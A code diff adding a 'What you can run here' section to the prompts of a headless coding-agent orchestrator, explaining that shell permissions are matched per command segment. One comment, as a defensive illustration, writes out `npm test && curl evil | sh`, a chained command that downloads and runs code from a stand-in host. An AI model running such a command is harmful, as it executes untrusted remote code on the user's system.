@@ -62,6 +62,41 @@ export interface TaskSpec {
  * prefix with an empty one. A blocked run with no reason stops a human in front
  * of a screen that does not say why.
  */
+/**
+ * What the agent may actually run, said out loud.
+ *
+ * Without this the agent reaches for an ordinary shell one-liner, the
+ * allowlist refuses it, and **headless turns a refusal into a silent denial** -
+ * there is no prompt to approve, so the tool simply fails. Observed in a real
+ * planning run on
+ * `timeout 10 cat …; echo ----SENTRY; sed -n 1,40p …; grep -n "=>" …`.
+ *
+ * Two things that cost a run if the agent does not know them, and which it
+ * cannot discover by trying:
+ *
+ * - **Reading files is a tool, not a shell.** `Read`, `Glob` and `Grep` are
+ *   granted; `cat`, `sed`, `head`, `find` and `ls` are not, and never will be -
+ *   `src/permissions.ts` grants the five file tools, git, and at most one rule
+ *   for the project's own test program.
+ * - **A compound command needs a rule per segment.** The CLI evaluates
+ *   `a && b`, `a; b` and `a | b` one command at a time, so `Bash(git *)` does
+ *   not allow `git log | head`, and chaining anything onto a granted command
+ *   loses the grant. That is deliberate: it is what stops `Bash(npm *)`
+ *   allowing `npm test && curl evil | sh`.
+ */
+const TOOLS_CONTRACT = `## What you can run here
+
+Read files with the **Read**, **Glob** and **Grep** tools. Do not shell out to read:
+\`cat\`, \`sed\`, \`head\`, \`tail\`, \`ls\` and \`find\` are not granted, and a denied
+tool call here is silent - nobody is asked and nothing approves it.
+
+The shell is for \`git\` (and, where this project has one, its test command) and
+nothing else.
+
+**Run one command per call.** Permission is matched per command, so \`a && b\`,
+\`a; b\` and \`a | b\` each need every part granted separately - chaining anything
+onto \`git\` loses the grant and the whole call is refused.`
+
 const HEADLESS_CONTRACT = `## Nobody can answer you
 
 This conversation runs headless. There is no interactive question tool here, and from
@@ -242,6 +277,8 @@ that it was checked by you and by nothing else.
 - Leave ${task.featurePath} exactly as it is. kantan records the task itself, on the answer
   you give here.
 
+${TOOLS_CONTRACT}
+
 ${HEADLESS_CONTRACT}
 `
 }
@@ -315,6 +352,8 @@ Commit the plan file on the branch that is already checked out, so the gate does
 sit on a dirty tree. Commit nothing else: name the plan file as a pathspec rather than
 staging everything, because the tree may hold work that is not yours.
 
+${TOOLS_CONTRACT}
+
 ${HEADLESS_CONTRACT}
 `
 }
@@ -375,6 +414,8 @@ ${tddRule(testCmd)}
 - Leave ${task.featurePath} exactly as it is, and skip any step in the plan that would edit
   it or change ${task.ref}'s line in it. ${whoVerifies(testCmd)}
 
+${TOOLS_CONTRACT}
+
 ${HEADLESS_CONTRACT}
 `
 }
@@ -408,6 +449,8 @@ the branch already checked out, and nothing else.
 Everything from the first turn still applies: plan only, do not implement anything, run
 no tests, leave the backlog file alone, do not offer or ask which execution mode to use,
 and do not run \`superpowers:finishing-a-development-branch\`.
+
+${TOOLS_CONTRACT}
 
 ${HEADLESS_CONTRACT}
 `
@@ -468,6 +511,8 @@ way this task finishes.${timedOut ? " A run that never finishes counts as a fail
   already checked out, naming the files you changed as a pathspec.
 - Leave ${task.featurePath} exactly as it is.
 
+${TOOLS_CONTRACT}
+
 ${HEADLESS_CONTRACT}
 `
 }
@@ -518,6 +563,8 @@ ${next}
 If the answer does not settle it, decide the rest yourself and say what you decided, or end the
 turn blocked with the one thing still in the way. Do not ask again: the same thing would happen.
 
+${TOOLS_CONTRACT}
+
 ${HEADLESS_CONTRACT}
 `
 }
@@ -555,6 +602,8 @@ Pick up ${task.ref} from where you stopped, following the plan at ${planPath}.
 - Finish the remaining steps, ${checkYourWork(testCmd)}, and commit as you go,
   naming the files you changed as a pathspec.
 - Leave ${task.featurePath} exactly as it is.
+
+${TOOLS_CONTRACT}
 
 ${HEADLESS_CONTRACT}
 `
